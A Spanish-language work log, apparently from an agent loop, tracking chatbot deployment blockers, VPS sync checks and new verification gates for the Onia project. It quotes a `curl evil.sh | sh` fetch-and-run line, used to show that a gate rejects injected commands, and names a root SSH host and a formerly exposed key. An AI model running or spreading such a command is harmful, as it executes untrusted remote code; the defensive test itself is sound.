| S14 | **De quién es la bandeja del widget (inbox 4)** — hoy no tiene org, y por ahí entraron **SEIS** conversaciones de desconocidos (34, 36, 38, 40, 45, 46), dos de ellas del 01-sep. **Cinco de las seis no dejaron teléfono ni correo**: sólo se les puede contestar desde adentro del widget, que es exactamente lo que el inbox huérfano impide — o sea que un inbox sin dueño no es una demora, es una pérdida. ⚠️ **A diferencia de S8, no alcanza con dos clicks:** está cerrado en esta cola que **una org sólo puede tener UN inbox** (`clinic_settings.chatwootInboxId`, `prisma/schema.prisma:1002`), y `Onia (interna)` ya gastó el suyo en el 5. ⚠️ **Corregido el 2026-09-02:** acá decía que esa columna era *"un `Int?` **único**"* y es falso — medido, no leído: no tiene `@unique` ni hay `@@unique` en `ClinicSettings`. Lo cierto de la frase es la mitad que importa para esta decisión (una org tiene UN inbox, porque es una columna escalar); lo que NO garantiza nadie es el otro sentido — **la base acepta que dos orgs reclamen el mismo inbox**, y el 409 que lo impide vive sólo en el PATCH de superadmin. No cambia las tres opciones de abajo, pero sí descarta "la base no me deja" como argumento. Desde hoy lo vigila `npm run inbox:tenencia`. **Opciones ya cotizadas en `ONIA_RADAR_DECISIONES_PRODUCTO.md` §9:** (a) darle el inbox 4 a otra org existente — cero código, pero mezcla el widget de Onia con una org que no es Onia; (b) crear una org `Onia (web)` sólo para el widget — cero código, ~10 min, agrega una org fantasma; (c) extender `clinic_settings` a N inboxes, que es código del producto y de otro carril. Recomendación: **(b)**. 🔁 **Fusionada el 2026-09-02 con la fila que la tabla listaba aparte bajo un SEGUNDO `S12`** (*"¿sigue en pie la opción 1 de §9?"*): era la **misma decisión preguntada dos veces**, con dos números distintos y uno de ellos ya usado por los horarios de demo. Lo destapó `npm run bloqueos:vencidos` al imprimir `S12, S12` — el gate nombra las filas por su id, así que un id repetido lo vuelve ambiguo. El dato fresco que aportaba esa fila (seis conversaciones, cinco sin contacto) es justo el que le faltaba a la condición de §9 *"hasta que la limitación moleste"*, y ya vive acá. **Y el `5 de las 9` que esta fila decía estaba viejo**: eran seis. | Es decidir en qué bandeja aterrizan los desconocidos de la web | **La otra mitad del objetivo del carril.** Hecho = se abre `/inbox` y se ve la conversación 45 (*"tengo una ferreteria"*) |
| S15 | **Una credencial de sólo lectura para que el canario ENTRE al panel del chatbot** — un usuario del producto (correo + contraseña) que sólo mire. Se enchufa como `ONIA_CANARIO_USER` / `ONIA_CANARIO_PASS` en el entorno del loop `canario-visual`; **no hay una línea de código pendiente**: `requiereSesion` y `iniciarSesion()` ya están en `scripts/canario_visual.mjs` y entran por el formulario real de `/login`. Sin ella el canario NO miente (desde hoy dice `NO MEDIDA` con el motivo), pero **la pantalla que un cliente usa para editar su conocimiento sigue sin que nadie la mire nunca**. ⚠️ La otra opción que el ítem original proponía —una ruta de vista previa pública— **se descarta**: expone configuración de cliente sin sesión, y es agregar una superficie viva | Es un alta de usuario en producción, y una contraseña | Que `/settings/chatbot` entre a la ronda del canario como las otras diez. Hecho = el canario imprime `panel-chatbot … sin disparo mecanico` y su baseline se crea con `urlFinal` = `/settings/chatbot` |
| ~~S16~~ | ✅ **VENCIDO el 2026-09-02 — Sergio no decide nada: la decisión ya se tomó y el trabajo ya llegó.** Pedía elegir entre cambiar el procedimiento del integrador, mergear a mano, o dejarlo. Pasaron **las dos primeras**: el integrador arregló su Paso 1 (`d26444c1` de `onia-hermes`, *"contaba las ramas contra el repo equivocado"*) y mergeó el carril a `master` de `onia-platform` (`503af44`, 12:38 UTC). Verificado con `git fetch` fresco y `merge-base --is-ancestor`: **los cuatro** commits declarados (`22fd088`, `675541b`, `d62beeb`, `e644c85`) llegan a `origin/master`; `npm run deploy:alcanzable` sale **0**. El radar §23 ya figuraba **RESUELTO** — sólo esta fila seguía pidiendo la decisión. Detalle en el primer ítem de "Cerrado". | — | — |
| S6 | **Proyecto Supabase cloud `Dental-gest` (`kvepqgikokjlacxngkiw`) sigue ACTIVE_HEALTHY** — decidir pausar o borrar. Y si algún día se reactiva `Gesti-Os` (`jafxylfocvvlflpqfsix`), **rotar su `service_role` primero**: estuvo expuesto en los JSON de n8n que se redactaron el 29-ago | Es plata y es borrado de datos | Cerrar la cola del saneamiento de secretos |

### S9 — el ítem completo, movido de "Ahora" el 2026-08-31

> Vivió diez vueltas en "Ahora" esperando un `scp` que sólo Sergio puede hacer, y cada
> vuelta le agregaba un párrafo que repetía la misma medición. Se mueve entero acá con su
> número: **un ítem bloqueado se vuelve a mirar cuando Sergio avisa, no cada 20 minutos.**
> Se borraron las cinco relecturas que sólo decían "sin cambios" (5ª, 6ª, 7ª, 8ª y 10ª
> vuelta); lo que cada una aportaba de verdad ya vive en la fila S9 de arriba o en Cerrado.
> Vuelve a "Ahora" el día que S9 se haga, con lo que queda: probar las frases MIRANDO.

**2 · Las frases que la web YA manda no están registradas como campañas: el desconocido
pregunta una cosa y el bot le contesta el saludo genérico.** Las frases de campaña se
construyeron ayer (`hermes-content/deploy/vps-ops/bot/recepcionista.mjs:117`
`campanaExacta`, espejo en `lib/chatbot/knowledge.ts:101`, deployadas en el commit
`e5c1ad3`) y **no las usa nadie**: cero campañas publicadas en ningún documento.
Mientras tanto onia.com.bo manda **seis frases fijas distintas** al mismo número, todas
desde `web-factory/apps/onia-platform/src/lib/site.ts` — "Hola, quiero conocer Onia"
(línea 41), "Hola, vengo de la web de Onia. Quiero saber si me sirve para mi negocio."
(49), y las tres de comercio/servicios/importadoras (52-58), más las de los
configuradores de servicios. Cada una es una intención declarada — la persona ya dijo
qué quiere antes de escribir — y el bot la trata a todas igual.
**Por qué es el ítem barato de mayor valor:** no hay que construir nada. La capacidad
existe, la distribución existe, el número atiende. Falta escribir el documento.
**Hecho =** las frases cargadas como campañas desde el panel
(`app/(dashboard)/settings/chatbot/EnsenaleConversando.tsx` las crea hablando),
publicadas, y las seis contestadas con su respuesta propia — probado por el probador
real y MIRADO.
⚠️ **No se toca `web-factory/apps/onia-platform/src/lib/site.ts`**: es del carril
web-factory. Las frases se copian tal cual están hoy; si alguna cambia allá, la campaña
deja de matchear y hay que re-copiarla.

⚙️ **Vuelta del 2026-08-31 — el documento está escrito, validado y con su guardia; lo que
falta NO es escribirlo.** Gate 1 primero, en vivo: `/opt/onia/bot/knowledge.json` del VPS
(leído por SSH, 904 bytes, del 6-ago) **no tiene `campanas`** — el hueco existe hoy.
**Corrección al ítem: no son seis frases vivas, son CINCO — y sólo cuatro las manda la web
de verdad.** Medido contra producción con `curl`, no leyendo el repo:
| frase | dónde | ¿la manda la web hoy? |
|---|---|---|
| "Hola, vengo de la web de Onia. Quiero saber si me sirve para mi negocio." | `WA_URL_LANDING` | **sí** — portada, /precios, /empezar, /contacto, /nosotros, /facturacion, /chatbot |
| "…Quiero consultoría/capacitación en IA para mi empresa." | `/servicios/consultoria` | **sí** |
| "…Quiero una propuesta de marketing con IA para mi negocio." | `/servicios/marketing-ia` | **sí** |
| "Hola, vengo de la página del chatbot de Onia. Tengo una consulta antes de elegir el stack." | `/v1/chatbot` | **sí** |
| "Hola, quiero conocer Onia" | `WA_URL`, `web-factory/apps/onia-platform/src/lib/site.ts:41` | **no**: export sin un solo consumidor |
| "Hola, quiero que me avisen cuando Onia para comercio/servicios/importadoras esté listo" | `WA_TEXT_*`, `web-factory/apps/onia-platform/src/lib/site.ts:52` | **no**: los tres son exports muertos, nadie los importa |
| "Hola, mi rubro no está en la lista de Onia. Mi negocio es: " | `/v1/empezar` | sí, pero es un **prefijo** — la persona escribe su rubro atrás, así que jamás puede ser match exacto |
Las tres "avisen cuando esté listo" además chocan con `MODULOS_LISTOS`
(`hermes-content/deploy/vps-ops/bot/config.mjs:408`): comercio y proveedores **ya están listos**. Que sean código muerto
refuerza la 📌 de abajo — no hay que corregir el texto, hay que borrarlo.
**Lo que se hizo:** `hermes-content/docs/chatbot/campanas-onia.knowledge.json` — el
documento de Onia (copia del vivo del VPS) con **5 campañas** (las 4 vivas + `WA_URL`, que
está a un import de volver). Pasa la **compuerta real de publicación**
(`node hermes-content/deploy/vps-ops/bot/knowledge.mjs --check <ruta>` → `OK`, exit 0) y las
cinco respuestas pasan los guardrails. Y su guardia:
`hermes-content/deploy/vps-ops/bot/campanas-web.test.mjs` **extrae las frases del código de
la web** en vez de hardcodearlas, así que el día que web-factory cambie una coma el test se
pone rojo en vez de morir en silencio. Suite del bot **619/619** verde (614 antes).
🔴 **Y apareció el motivo REAL de por qué el ítem no se puede cerrar, que no es el
documento.** `campanaExacta` vive dentro de `recepcionistaStep` (`hermes-content/deploy/vps-ops/bot/recepcionista.mjs:192`), y
el modo recepcionista lo enciende sólo `asRecepcionista`, al que `withKnowledge` llama
**únicamente si la fuente es `"db"`** — la fila publicada de una **org**, resuelta por
`clinic_settings.chatwootInboxId` (`hermes-content/deploy/vps-ops/bot/knowledge.mjs:851`). El +591 75414930 hoy se atiende
desde el **archivo** del VPS, o sea **modo venta, donde las campañas ni se miran**. Corrido
con la misma frase por los dos caminos: archivo → `M0_SIN_HORARIOS` (el saludo genérico que
el ítem describe), db → `R_CAMPANA` con la respuesta propia y `guardrail.ok: true`.
**Cargar las campañas a mano en el VPS no serviría de nada.** El ítem 2 estaba mal
diagnosticado: no le faltaba un documento, le falta **el mismo vínculo org→inbox del ítem
1**. Los dos ítems de Ahora son el mismo bloqueo, y es **S8**. Anotado en
`hermes-content/docs/ONIA_RADAR_DECISIONES_PRODUCTO.md` §9.
**Lo que queda del ítem, cuando S8 se destrabe:** cargar estas 5 campañas en el editor de la
org dueña del inbox 5, publicar, y probar las 4 frases vivas MIRANDO la pantalla.

⚙️ **Vuelta del 2026-08-31 (segunda) — el ítem YA NO depende de S8, y el plan de arriba
estaba equivocado.** Gate 1 sobre el propio diagnóstico, leyendo el motor: `campanaExacta`
se llamaba **sólo** desde `hermes-content/deploy/vps-ops/bot/recepcionista.mjs:192`, y `hermes-content/deploy/vps-ops/bot/bot-engine.mjs:448` corta el modo
recepcionista antes de todo el guion de venta. O sea que el plan escrito arriba —"cargar
las campañas en la org dueña del inbox 5"— **metía el número de Onia en modo recepcionista**,
que es la config del bot de un CLIENTE. Ahí el embudo de leads no existe: lo dice el test
`recepcionista: 'DEMO' NO dispara el funnel — el guion de leads queda exclusivo del modo
venta`. Y `R_CAMPANA` es literalmente `{{respuesta_campana}}` (`hermes-content/deploy/vps-ops/bot/config.mjs:317`), sin un solo
efecto: **se habría cambiado la única línea que produce leads por un texto enlatado.**
**Lo que se hizo en su lugar** — que las campañas también se vean desde el modo venta, que es
donde caen los wa.me?text= de onia.com.bo:
- `hermes-content/deploy/vps-ops/bot/knowledge.mjs` (`applyKnowledge`) ahora lleva `campanas` a la config de los DOS modos.
  `campanaExacta(config, norm)` lee `.campanas`, así que la misma función sirve a ambos sin
  tocarla (el recepcionista le sigue pasando `config.conocimiento`).
- `hermes-content/deploy/vps-ops/bot/bot-engine.mjs`: la frase de campaña se resuelve en el router **antes** de los intents
  difusos (es un match del mensaje ENTERO, la señal más específica que puede llegar) y sale
  por `composeWithFunnel`, el mismo camino que ya usan precio y SIAT. Efecto: la respuesta va
  **detrás** de la bienvenida, no en lugar de ella — se conservan M0 (el bot se declara bot,
  D2), la oferta de horarios y el `lead_upsert`.
- `composeWithFunnel` acepta `vars` (R_CAMPANA es la única plantilla de ese camino cuyo texto
  no está en el guion: lo trae el documento publicado).
**Probado con el documento real, no con un fixture** (las 5 campañas de
`hermes-content/docs/chatbot/campanas-onia.knowledge.json` corridas por el motor en modo venta): las cinco contestan su
propia respuesta y las cinco conservan `lead_upsert` + `notify_sergio`. Antes de este cambio
las cinco daban `M0_SIN_HORARIOS` solo — exactamente el saludo genérico que el ítem denuncia.
**7 tests nuevos** (incluido el guardia de no-regresión "sin campañas publicadas el motor no
cambia" y "el opt-out le gana a la campaña"). Suite del bot **626/626** verde (619 antes).
La compuerta de publicación sigue en `OK` sobre el documento.
⚠️ **Lo único que queda, y es MUCHO más barato que S8:** copiar
`hermes-content/docs/chatbot/campanas-onia.knowledge.json` a `/opt/onia/bot/knowledge.json`
del VPS (hoy tiene 904 bytes y no trae `campanas`) y probar las 4 frases vivas MIRANDO. Eso
es un deploy al VPS ⇒ **OK de Sergio**, pero ya no hace falta decidir dueño de inbox ni
desplegar el producto. **Corrección a S8:** el ítem 2 sale de su lista de desbloqueos.

🔴 **Vuelta del 2026-08-31 (tercera) — S9 estaba MAL ESCRITO, y hacerlo tal como decía no
habría encendido nada.** El párrafo de arriba afirma *"El motor ya las lee en modo venta
(626/626 verde)"*. Eso es cierto **en el espejo del repo** y falso en el VPS: el motor se
verificó localmente y se dio por desplegado sin mirarlo. Medido con md5, los dos lados:
| archivo | espejo del repo | VPS `/opt/onia/bot/` |
|---|---|---|
| `hermes-content/deploy/vps-ops/bot/bot-engine.mjs` | `b5a5c878…` = commit `994eb42d` (campañas) | `7f50f1a9…` = commit `3e3841aa` (comprobantes) |
| `hermes-content/deploy/vps-ops/bot/knowledge.mjs` | `4ba53652…` | `d00a3c1f…` |
| `hermes-content/deploy/vps-ops/bot/campanas-web.test.mjs` | existe | **no existe** |
El VPS quedó **exactamente un commit atrás**: `994eb42d` nunca viajó. Confirmado sin
grep de descarte sino contando en el motor que CORRE (contenedor `onia-center`,
`/tmp/onia-bot/bot-engine.mjs`): **cero apariciones de `campanaExacta`**.
**La consecuencia si Sergio hacía S9 tal como estaba escrito:** copiaba las 5 campañas a
`/opt/onia/bot/knowledge.json`, el motor viejo las ignoraba —no tiene el código que las
lee—, las 4 frases vivas seguían recibiendo el saludo genérico, y el ítem se daba por
cerrado. Un fantasma más, y del tipo caro: uno que se escribe DESPUÉS de que alguien puso
las manos en producción.
**S9 corregido:** no es sólo el documento. Tienen que viajar **`hermes-content/deploy/vps-ops/bot/bot-engine.mjs`,
`hermes-content/deploy/vps-ops/bot/knowledge.mjs`** y el documento a `/opt/onia/bot/knowledge.json`, y hay que **reiniciar** (`hermes-content/deploy/vps-ops/bot/webhook-server.sh`
recopia al contenedor sólo cuando cambia su STAMP).
**Lo construido para que esto no vuelva a pasar** — porque ya pasó dos veces, las dos
descubiertas de casualidad y en direcciones opuestas (`d334d776`: el espejo quedó 25
archivos atrás del VPS; hoy: el VPS quedó atrás del espejo):
`hermes-content/deploy/vps-ops/bot/espejo-check.mjs` — un md5 por lado, sólo lectura, sin
tocar el VPS. Sale 0 si el código coincide y 1 nombrando los archivos si no.
El documento publicado y los `webhook.env*` quedan fuera del veredicto **a propósito**: son dato
vivo, no código, y un gate que siempre está rojo lo apaga alguien.
**Corrido contra producción**, que es la prueba de que sirve:
```
ESPEJO DESINCRONIZADO — …/vps-ops/bot/ vs root@187.77.16.63:/opt/onia/bot
  DISTINTOS (el VPS corre otra version): bot-engine.mjs, bot-engine.test.mjs, knowledge.mjs
  FALTAN EN EL VPS (deploy a medias):    campanas-web.test.mjs, recepcionista.test.mjs
```
8 tests nuevos (`hermes-content/deploy/vps-ops/bot/espejo-check.test.mjs`), uno de ellos con los md5 REALES de hoy: si ese
caso pasara en verde, el gate no serviría. Suite del bot **634/634** (626 antes).
📎 **Trampa que costó tres consultas y queda escrita en el encabezado del script:** el
motor vive en TRES lugares —espejo, `/opt/onia/bot` del host, y `/tmp/onia-bot` **dentro
del contenedor `onia-center`**, que es el que corre—. `ps` en el host muestra
`node /tmp/onia-bot/webhook-server.mjs` y ese directorio **no existe en el host**: es el
`/tmp` del contenedor. El 3 se rehace solo del 2 por el STAMP de `hermes-content/deploy/vps-ops/bot/webhook-server.sh`, así
que alinear el 2 es lo que el próximo restart lleva al bot vivo.

✅ **Gate 1 del 2026-08-31 (cuarta vuelta) — el motor YA VIAJÓ; queda SOLO el documento.**
La tabla de md5 de arriba quedó vieja y hacía perder la vuelta: `espejo-check.mjs` corrido
hoy contra producción sale **0 — `ESPEJO OK`**, o sea que `bot-engine.mjs`, `knowledge.mjs`
y `run-turn.mjs` del VPS ya son los del repo. Y verificado donde importa, en el motor que
**corre** y no en el host: `docker exec onia-center grep -c campanaExacta
/tmp/onia-bot/bot-engine.mjs` da **2**, cuando la vuelta anterior contó **0**.
**Lo que sigue faltando, medido dentro y fuera del contenedor:** `knowledge.json` está en
**904 bytes del 6-ago y sin `campanas`** en los dos lugares. O sea que el motor sabe leer
campañas y el archivo del número no trae ninguna — las 4 frases vivas de onia.com.bo
siguen recibiendo el saludo genérico, pero por UNA razón y no por cuatro.
**S9 quedó en un archivo de datos:** copiar
`hermes-content/docs/chatbot/campanas-onia.knowledge.json` a `/opt/onia/bot/knowledge.json`
y reiniciar. Sigue siendo un deploy ⇒ **OK de Sergio**.

⚙️ **Vuelta del 2026-08-31 (novena) — el CTA de `/v1/empezar` ya no puede tener campaña
"nunca": ahora la tiene. Y el mismo cambio destapó que S9, tal como estaba escrito, HOY
ROMPE producción.**
**Gate 1 primero, en el motor y no en el papel.** La tabla del ítem declara una de las
frases vivas como imposible: *"Hola, mi rubro no está en la lista de Onia. Mi negocio es: "*
es un **prefijo** — la persona escribe su rubro atrás, así que el mensaje entero nunca es
igual a la frase. Estaba escrito como decisión, con su motivo, en `NO_MATCHEABLES` de
`hermes-content/deploy/vps-ops/bot/campanas-web.test.mjs`. Verificado que sigue viva hoy,
con `curl` a producción y no leyendo el repo:
`https://onia.com.bo/v1/empezar` renderiza
`wa.me/59175414930?text=Hola%2C%20mi%20rubro%20no%20est%C3%A1...Mi%20negocio%20es%3A%20`.
Y medido en el motor, las dos variantes contestaban **`M0` pelado**: quien MÁS información
declaró —su rubro, y que no está en la lista— recibía exactamente lo mismo que quien
escribe "hola".
**Lo que se hizo, y es opt-in por campaña a propósito:** una campaña puede declarar
`prefijo: true` y entonces matchea también cuando el mensaje **sigue**
(`hermes-content/deploy/vps-ops/bot/recepcionista.mjs`, `campanaExacta`). Sin el campo, el
match sigue siendo del mensaje entero — una campaña normal no se estira sola. El match
exacto **le gana siempre** al prefijo, y entre dos prefijos gana la frase más larga; el
límite es un espacio, así que `mi negocio es` no se come `mi negocio establecido`.
`prefijo` agregado al esquema (`knowledge.mjs`) y la **sexta campaña** al documento
(`hermes-content/docs/chatbot/campanas-onia.knowledge.json`, `version` → `2026-08-31.2`),
que sigue pasando la compuerta real de publicación (`--check` → `OK`, exit 0).
**Probado con el documento REAL corrido por el motor**, no con un fixture: las dos
variantes (`…Mi negocio es: panadería` y el prefijo pelado) salen ahora **`M0` + `R_CAMPANA`
con `lead_upsert`**, y `hola` sigue saliendo `M0` solo — o sea que no se le comió el flujo
normal a nadie. **6 tests nuevos**, y se comprobó que pueden fallar: apagando la rama del
prefijo, 2 se ponen rojos nombrando el caso. Suite del bot **682/682** (676 antes).
🔴 **Y lo que más vale de esta vuelta, que es un hallazgo sobre S9 y no sobre el prefijo.**
El esquema del validador **rechaza claves desconocidas**, y `parseKnowledge` devuelve
`data: null` cuando el veredicto no es `ok` — o sea que un documento rechazado no carga
"a medias": **no carga nada**. Bajado el `knowledge.mjs` que HOY corre en el VPS
(41.423 bytes, cero `prefijo`) y corrido su propio `validateKnowledge` contra el documento
nuevo:
```
ok= false
errors= ["campanas[4].prefijo: clave desconocida (el esquema no la acepta)"]
```
**Si S9 se hace como estaba escrito —copiar sólo `knowledge.json`— el motor viejo tira el
documento ENTERO:** no quedan 5 campañas andando y 1 ignorada, quedan **cero**, y además
se pierden la FAQ `siat` y el horario que hoy sí están vivos. Sería un deploy que empeora
producción, hecho siguiendo la instrucción al pie. **S9 corregido ARRIBA, en su fila: viajan TRES
archivos.**


---

## Cerrado — no rehacer

- [x] **La guarda de entrada de `espejo-check.mjs` reventaba al importarlo, y el molde ya se había
      copiado a otro gate.** Hecho el 2026-09-02, en la misma vuelta en que se encontró.
      Archivos: `hermes-content/deploy/vps-ops/bot/espejo-check.mjs`, `scripts/s11_desplegado.mjs`.
      La guarda armaba la URL a mano —`new URL("file://" + process.argv[1])`— y con
      `node -e "import(...)" <arg>` el `argv[1]` es el **argumento**, no una ruta: tira
      `ERR_INVALID_URL` y el módulo no se puede importar. Apareció al probar el verificador nuevo
      de S11, que había copiado esa guarda de acá; reproducido después sobre el original. Va con
      `pathToFileURL`, que además resuelve solo el escapado y las barras invertidas, así que se
      cae el `replace(/\\/g,"/")` a mano. Verificado que sigue corriendo como programa —**S9
      depende de él** y sigue dando 1— y que ahora sí se importa. Suite: **21/21**.

- [x] **S11 era el único bloqueo que una máquina podía medir y no se medía: ahora se comprueba
      solo.** Cerrado el 2026-09-02. Archivos: `scripts/s11_desplegado.mjs` (nuevo),
      `package.json`, `hermes-content/docs/cola/chatbot.md`.
      **Qué se construyó.** `npm run s11:desplegado` le pregunta al contenedor `onia-platform`
      del VPS —el que CORRE; no el host, no el repo, no `origin/master`— con qué icono dibuja la
      entrada `/requerimientos` de su build publicado en `/app/.next`. Sale **1** con el defecto
      vivo nombrando el icono, **0** con el swap hecho, y **2** si no pudo medir. La fila S11 ya
      lo declara con la marca `**Verificador:** … → 0`, así que `npm run bloqueos:vencidos` lo
      levanta solo: pasó de correr **dos** verificadores a **tres**, y de 12 filas "sin
      verificador mecánico" a 11.
      **Medido, no leído.** Con el defecto vivo de hoy sale 1 y nombra `assignment_turned_in`.
      La rama verde también se probó de punta a punta —tubería de shell real + parser— contra un
      bundle con `task_alt`: sale 0. Las dos ramas, no sólo la que da rojo hoy.
      🔴 **Lo obvio era un `grep assignment_turned_in` y habría quedado en ROJO PARA SIEMPRE.** El
      fuente ya arreglado **sigue conteniendo** esa cadena: `components/layout/navigation.ts:45`
      la nombra en un comentario que explica por qué se eligió `task_alt`, y
      `scripts/iconos-en-la-fuente.mjs` la usa de caso de prueba. Hoy la minificación los borra,
      pero eso es una propiedad del minificador, no del arreglo — alcanza un source map o que
      alguien mueva el comentario a un string. Un verificador que no puede ponerse verde es peor
      que ninguno: es el mismo modo de falla que este gate existe para cerrar. Por eso mide el
      **par ruta→icono**, que es el hecho del mundo que la fila declara; un comentario no forma
      ese par. El self-check tiene ese caso, y se comprobó que la versión ingenua lo falla.
      **Dos cosas que sólo aparecieron al medir, y las dos eran bugs de este script:**
      **(1)** la primera versión tardaba **48 s** — `grep -o` con ventana ancha backtrackea sobre
      chunks minificados de megabytes (13 s con ventana 60, 27 s con 120, 48 s con 220, lineal).
      El gate que lo invoca corta a los **120 s**, y ahí un timeout se lee como "no medido": el
      verificador se volvía inútil solo con que el build creciera. Partir el bundle en `}` antes
      de filtrar lo dejó en **0,8 s** (58×), porque las entradas de menú son objetos planos.
      **(2)** la guarda de entrada, copiada de `espejo-check.mjs`, construía la URL a mano
      (`new URL("file://" + argv[1])`) y **reventaba** con `ERR_INVALID_URL` al importar el módulo
      con argumentos — o sea que importar las funciones puras rompía. Va con `pathToFileURL`.
      Antes de esa guarda, un `import` disparaba un `docker exec` contra producción como efecto de
      cargar el módulo.
      **Gates:** `npm test` completo en verde, con `test:s11-desplegado` (14 casos) cableado a la
      cadena — y verificado **en rojo primero**: `test:guards-cableados` mordió con *"estos tests
      existen y NO los corre nadie"* antes de cablearlo.

- [x] **Los bloqueos ya declaraban cómo comprobarse solos y nadie los comprobaba: ahora hay un
      gate que los corre.** Cerrado el 2026-09-02. Archivos: `scripts/bloqueos_vencidos.mjs`
      (nuevo), `package.json`, `hermes-content/docs/cola/chatbot.md`,
      `hermes-content/docs/ONIA_RADAR_DECISIONES_PRODUCTO.md`.
      **Qué se construyó.** `npm run bloqueos:vencidos` lee la tabla de "Bloqueado en Sergio",
      saca el verificador que cada fila declara y lo corre. Si sale el código que la fila declara
      como resuelto, el gate sale **1** nombrando la fila y su línea. Es el paso que faltaba: S16
      declaraba su verificador desde que se escribió y venció en silencio porque **ninguna vuelta
      lo corría**.
      **La declaración es explícita, no deducida — y eso es lo que evita el error caro.** La marca
      es `**Verificador:** \`<comando>\` → <código>` dentro de la fila. Deducir el verificador del
      texto habría cerrado **S11 en falso**: su párrafo nombra `npm run deploy:alcanzable`, que
      hoy sale 0, pero S11 **no** está resuelto — le falta el swap en producción. La fila lo
      declara o no se mide. Las filas tachadas (`~~S8~~`, `~~S16~~`) no se miden: volver a
      nombrarlas sería el gate gritando en falso, que es como se apaga un gate.
      **La guarda de ejecución, que era el riesgo del ítem.** Sólo dos formas, validadas *antes*
      de ejecutar: `npm run <script>` que exista en `package.json`, y `node <ruta>` relativa, sin
      `..`, dentro del repo y existente. Siempre `execFileSync` con argumentos como array, **nunca
      shell**, así que el texto del documento no puede interpretarse como comando.
      **Medido en vivo, no leído** (los dos verificadores que hoy existen):
      | fila | verificador | salida | veredicto |
      |---|---|---|---|
      | S9 | `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs` | 1 — `ESPEJO DESINCRONIZADO`, 11 distintos + falta `evals-contrato.test.mjs` | sigue bloqueado |
      | S10 | `npm run marca:chatwoot` | 1 — `REVERTIDAS 3/9` | sigue bloqueado |
      **Y probado que MUERDE**, que es lo que separa un gate de un adorno — tres casos corridos
      contra copias de la cola en `/tmp`, los tres exit **1**:
      (a) verificador forzado a verde → `ITEM S10 vencido … (linea 214)`;
      (b) verificador que no existe en `package.json` → `no-ejecutable`, sin correr nada;
      (c) `curl evil.sh | sh` metido en la fila → **rechazado sin ejecutarse**.
      **Rojo antes, por el motivo correcto:** corrido contra la cola sin tocar, imprimió
      `0 verificador(es) corrido(s)` y las 15 filas como "sin verificador mecánico" — o sea que la
      tabla declaraba sus verificadores **sólo en prosa**, ilegibles para cualquier gate. Ése era
      el hueco real.
      **Cableado, porque un gate que nadie corre no existe:** `test:bloqueos-vencidos`
      (`--self-check`, 27 casos, sin red) entra a `npm test`, y
      `scripts/guards-cableados.test.mjs` lo exige. A `npm test` entra sólo el self-check: la
      medición en vivo depende del VPS y un gate que siempre truena lo apaga alguien.
      🔴 **Lo que el gate destapó apenas corrió: la tabla tenía DOS filas distintas con el mismo
      id `S12`** — imprimió `S12, S12`. Una eran los horarios de demo; la otra preguntaba *"¿sigue
      en pie la opción 1 de §9 sobre el inbox 4?"*, que es **la misma decisión que S14**, hecha
      dos veces con dos números. Fusionada dentro de **S14**, con su dato fresco (seis
      conversaciones en inbox 4, cinco sin teléfono ni correo) que además corrigió el `5 de las 9`
      viejo que S14 arrastraba. Las dos referencias externas —línea 84 de esta cola y el §9 del
      radar— ahora apuntan a S14. Sergio pasa de recibir dos preguntas a recibir una.
      **Gates:** `npm test` completo en verde.

- [x] **S16 era un bloqueo VENCIDO: le pedía a Sergio una decisión que ya estaba tomada, y de
      paso mantenía a S11 afirmando algo falso.** Cerrado el 2026-09-02. Archivos:
      `hermes-content/docs/cola/chatbot.md`. Salió de auditar los `[x]` — "Ahora" estaba vacío y
      ninguno de los tres de "Después" da trabajo de código.
      **Lo que se auditó y salió CIERTO** — se escribe porque una auditoría que sólo reporta lo
      que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy en vivo |
      |---|---|
      | los 7 loops `VPS` de `loops.md` están en `crontab -l` | los 7, con su expresión exacta. Nada que rearmar |
      | S9 sigue vivo | `espejo-check.mjs` → `ESPEJO DESINCRONIZADO`, 11 distintos, y `VIAJAN JUNTOS` sigue nombrando `recepcionista.mjs → config.mjs + intents.mjs`. **Dato nuevo:** ahora además **falta** `evals-contrato.test.mjs` en el VPS |
      | S10 sigue vivo | `npm run marca:chatwoot` → `REVERTIDAS 3/9` (`BRAND_URL`, `TERMS_URL`, `PRIVACY_URL`) |
      | `campanas:vivas` sale 0 | exit **0**, `5 frases vivas, 5 con campaña` |
      | el gate de iconos quedó cableado (`d62beeb`) | `__tests__/gate-iconos-esta-cableado.test.ts` existe, y `ci` es `… && npm run gate:iconos && npm run build` — el gate **antes** del build, como dice el ítem |
      | el ítem del disco de "Después" | es de la máquina **Windows** de Sergio, no de acá: el VPS donde corre este loop va al **72 %**, con 56 GB libres y **2** worktrees de `onia-platform`, no 30. No es medible desde este carril, y el ítem ya lo decía |
      🔴 **Lo que salió FALSO, y es la clase de error que el propio loop llama "peor que un
      fantasma": el bloqueo VENCIDO.** La fila S16 pedía elegir entre (a) que el integrador
      extendiera su Paso 1 al segundo repo, (b) mergear a mano, o (c) dejarlo. **Ya habían pasado
      (a) y (b), hacía media hora**, y la cola seguía preguntando. Medido con `git fetch` fresco y
      `merge-base --is-ancestor`, no leído:
      - el integrador arregló su Paso 1 en `d26444c1` de `onia-hermes` (*"contaba las ramas contra
        el repo equivocado y tres arreglos visibles quedaron varados"*), ya en `origin/main`;
      - mergeó el carril a `master` de `onia-platform` en `503af44` (12:38 UTC);
      - **los cuatro** commits que la cola declara (`22fd088`, `675541b`, `d62beeb`, `e644c85`)
        llegan a `origin/master`, y `npm run deploy:alcanzable` pasó de **1** a **0**;
      - el radar §23 ya figuraba **RESUELTO — Sergio NO decide nada**. La cola de este carril era
        el único lugar donde la decisión seguía abierta.
      **El daño real no era S16 sino su vecina.** S11 abría con *"commiteado y pusheado, pero NO
      llega a `master`: ver S16"* — con el commit ya en `master`. Esa frase es exactamente la que
      le dice a Sergio que dar el OK del deploy no sirve de nada. Un bloqueo vencido no se queda
      quieto: le presta su motivo falso al de al lado.
      **Y S11 NO se cierra, porque el defecto sigue vivo en producción** — verificado contra el
      sistema correcto, no contra el repo: el contenedor `onia-platform` lleva **15 h** arriba
      (anterior al merge de las 12:38) y su build publicado todavía contiene
      `assignment_turned_in` (`docker exec … grep -rl` sobre `/app/.next`). Lo que cambia es el
      motivo: antes el deploy no podía arreglarlo, ahora **sí**. Falta sólo el swap, que es de él.
      **Lo que queda abierto, y es el ítem de "Ahora":** los tres bloqueos con verificador
      mecánico (S9, S10, S16) declaran cómo se comprueban solos, y **ninguna vuelta los corre como
      paso propio**. S16 se destapó de casualidad. Mientras eso no sea un gate, el próximo bloqueo
      que venza lo encuentra el azar otra vez.

